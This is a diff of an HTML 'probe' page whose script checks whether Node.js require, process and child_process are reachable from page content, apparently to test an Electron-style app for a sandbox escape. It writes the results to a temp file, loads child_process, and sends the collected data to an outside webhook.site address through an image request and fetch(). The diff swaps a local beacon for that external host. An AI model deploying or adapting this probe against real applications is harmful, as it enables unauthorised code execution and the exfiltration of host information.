@@ -1,7 +1,7 @@
 <!doctype html><html><head><meta charset="utf-8"><title>probe</title></head><body>
 <script>
 (function(){
-  var out = {href: location.href, origin: location.origin, ua: navigator.userAgent};
+  var out = {href: location.href, origin: location.origin, ts: Date.now()};
   function t(n){ try { return eval('typeof '+n); } catch(e){ return 'ERR:'+e.message; } }
   out.require = t('require');
   out.process = t('process');
@@ -10,10 +10,10 @@
   out.nodepatch = t('window._nodeJs');
   out.api = t('window.api');
   try { out.parentRequire = typeof parent.require; } catch(e){ out.parentRequire = 'X:'+e.message; }
+  out.stage = 'loaded';
   try {
     if (typeof require === 'function') {
-      var fs = require('fs');
-      var os = require('os');
+      var fs = require('fs'); var os = require('os');
       var p = os.tmpdir().replace(/\\/g,'/') + '/xz_iframe_probe.json';
       fs.writeFileSync(p, JSON.stringify(out));
       var cp = require('child_process');
@@ -21,7 +21,9 @@
       out.exec = 'ok';
     }
   } catch(e){ out.err = String(e && e.message || e); }
-  try { (new Image()).src = 'http://127.0.0.1:18899/beacon?d=' + encodeURIComponent(JSON.stringify(out)); } catch(e){}
+  var q = 'https://webhook.site/2c1519e1-b2c5-4ee8-8838-b0489d80dbe9?d=' + encodeURIComponent(JSON.stringify(out));
+  try { (new Image()).src = q; } catch(e){}
+  try { fetch(q).catch(function(){}); } catch(e){}
   document.title = 'probe require=' + out.require;
 })();
 </script>
